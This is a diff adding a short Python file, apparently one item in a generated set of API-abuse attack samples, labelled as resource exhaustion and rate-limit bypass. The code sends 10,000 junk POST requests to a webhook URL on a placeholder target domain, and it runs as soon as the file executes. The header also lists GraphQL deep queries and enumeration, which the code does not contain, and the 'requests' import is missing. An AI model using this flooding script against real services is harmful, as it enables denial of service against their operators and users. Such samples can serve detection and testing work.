@@ -1,0 +1,12 @@
+# Resource Exhaustion - API Abuse Sample 10
+# Created: 2026-03-30T22:24:11.730255
+# Type: API Rate Limit Bypass / Enumeration / GraphQL Deep Query
+
+# API Webhook Spam - Sample 4
+def webhook_spam():
+    webhook_url = "https://hooks.target.com/trigger"
+    for i in range(10000):
+        payload = {"event": "test", "data": f"spam_{i}"}
+        requests.post(webhook_url, json=payload)
+        
+webhook_spam()
